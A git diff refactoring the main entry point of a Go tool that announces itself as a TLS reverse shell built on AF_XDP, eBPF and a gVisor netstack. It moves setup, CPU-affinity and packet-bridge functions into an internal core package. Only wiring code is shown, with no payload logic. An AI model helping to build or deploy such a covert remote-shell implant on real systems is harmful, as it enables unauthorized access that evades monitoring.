@@ -22,6 +22,8 @@ import (
 	"runtime"
 	"syscall"
 
+	"github.com/cezamee/Yoda/internal/core"
+
 	"github.com/cilium/ebpf/rlimit"
 )
 
@@ -35,27 +37,27 @@ func main() {
 	// Detect system topology for CPU affinity optimization
 	// Détecte la topologie système pour optimiser l'affinité CPU
 	fmt.Printf("🚀 Initializing Grogu TLS AF_XDP Reverse Shell with CPU Affinity Optimization\n")
-	detectNUMATopology()
+	core.DetectNUMATopology()
 
 	// Initialize XDP components
 	// Initialise les composants XDP
-	coll, _, _, statsMap, cb, l, srcMAC, queueID := initializeXDP(interfaceName)
+	coll, _, _, statsMap, cb, l, srcMAC, queueID := core.InitializeXDP(core.InterfaceName)
 	defer coll.Close()
 	defer l.Close()
 
 	// Create Gvisor netstack
 	// Crée la netstack Gvisor
-	netstackStack, linkEP := createNetstack()
+	netstackStack, linkEP := core.CreateNetstack()
 
 	// Create bridge with correct structure
 	// Crée le bridge avec la bonne structure
-	bridge := &NetstackBridge{
-		cb:       cb,
-		queueID:  queueID,
-		stack:    netstackStack,
-		linkEP:   linkEP,
-		statsMap: statsMap,
-		srcMAC:   srcMAC,
+	bridge := &core.NetstackBridge{
+		Cb:       cb,
+		QueueID:  queueID,
+		Stack:    netstackStack,
+		LinkEP:   linkEP,
+		StatsMap: statsMap,
+		SrcMAC:   srcMAC,
 	}
 
 	c := make(chan os.Signal, 1)
@@ -65,20 +67,20 @@ func main() {
 
 	go func() {
 		if runtime.NumCPU() >= 4 {
-			if err := setCPUAffinity(cpuRXProcessing); err != nil {
+			if err := core.SetCPUAffinity(core.CpuRXProcessing); err != nil {
 				fmt.Printf("⚠️ CPU affinity for RX processing failed: %v\n", err)
 			}
 		}
-		bridge.startPacketProcessing()
+		bridge.StartPacketProcessing()
 	}()
 
 	go func() {
 		if runtime.NumCPU() >= 4 {
-			if err := setCPUAffinity(cpuTLSCrypto); err != nil {
+			if err := core.SetCPUAffinity(core.CpuTLSCrypto); err != nil {
 				fmt.Printf("⚠️ CPU affinity for TLS crypto failed: %v\n", err)
 			}
 		}
-		bridge.setupTCPServer()
+		bridge.SetupTCPServer()
 	}()
 	<-c
 }
